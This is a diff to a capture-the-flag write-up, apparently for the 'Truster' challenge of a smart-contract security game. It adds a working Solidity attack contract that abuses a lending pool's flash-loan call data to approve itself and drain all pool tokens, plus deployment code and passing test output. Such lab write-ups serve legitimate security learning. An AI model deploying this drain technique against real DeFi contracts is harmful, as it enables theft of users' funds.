@@ -72,15 +72,41 @@ To pass this challenge, take all tokens out of the pool. If possible, in a singl
 
 
 ```solidity
+pragma solidity ^0.8.0;
 
+import "../truster/TrusterLenderPool.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract AttackTruster {
+
+    TrusterLenderPool pool;
+    constructor(address payable _pool){
+        pool = TrusterLenderPool(_pool);
+    }
+
+    function attack(IERC20 token)external{
+        uint balance = token.balanceOf(address(pool));
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), balance);
+        pool.flashLoan(0, msg.sender, address(token), data);
+        token.transferFrom(address(pool), msg.sender, balance);
+    }
+}
 ```
 
 ```js
-
+const AttackFactory = await ethers.getContractFactory('AttackTruster', deployer);
+attack = await AttackFactory.deploy(pool.address);
+await attack.connect(player).attack(token.address);
 ```
 
 ```powershell
+  [Challenge] Truster
+    ✔ Execution (73ms)
 
+
+  1 passing (2s)
+
+Done in 2.75s.
 ```
 
 **_by wasny0ps_**
